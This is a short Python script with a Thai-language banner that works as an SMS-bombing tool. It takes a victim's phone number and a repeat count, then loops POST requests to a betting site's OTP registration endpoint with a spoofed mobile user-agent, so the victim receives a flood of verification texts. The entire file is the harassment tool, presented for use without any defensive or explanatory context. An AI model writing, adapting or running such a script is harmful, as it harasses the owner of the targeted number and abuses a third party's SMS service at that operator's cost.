import requests,time

print("""
	[ ยิงSMSโง่ๆ]
	   -By-sck-
""")

no = input('ตัวอย่าง : 08xx\n[👉] Phone: ')
jml = int(input('[👉] จำนวน: '))

heder = {'Host': 'auth.apixbet.com',
           'content-length': '43',
           'content-type': 'application/json',
           'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}

data = {'phone_number': no,
            'code':'aff1'}

print("\n[กำลังส่ง]")
for i in range(jml):
      sec = requests.post('https://auth.apixbet.com/api/register/sendOtp', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. เบอร์ {no}')
      else:
           print(f'{i+1}. เบอร์ {no}')
      time.sleep(10)
      